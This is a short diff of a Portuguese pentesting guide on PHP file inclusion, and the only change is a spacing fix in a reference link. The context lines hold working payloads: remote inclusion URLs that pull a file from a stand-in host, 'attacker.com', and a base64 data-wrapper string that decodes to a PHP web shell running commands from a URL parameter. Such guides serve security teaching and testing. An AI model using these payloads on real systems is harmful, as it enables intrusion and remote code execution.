@@ -91,7 +91,7 @@ http://example.com/index.php?page=http://atacker.com/mal.php
 http://example.com/index.php?page=\\attacker.com\shared\mal.php
 ```
 <p>Se por algum motivo allow_url_include estiver ativado, mas o PHP estiver filtrando o acesso a páginas externas, você pode usar, por exemplo, o wrapper data com base64 para decodificar um código PHP base64 e egt RCE:</p>
-[Ref.:](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)
+[Ref.:] (https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)
 
 ```
 PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
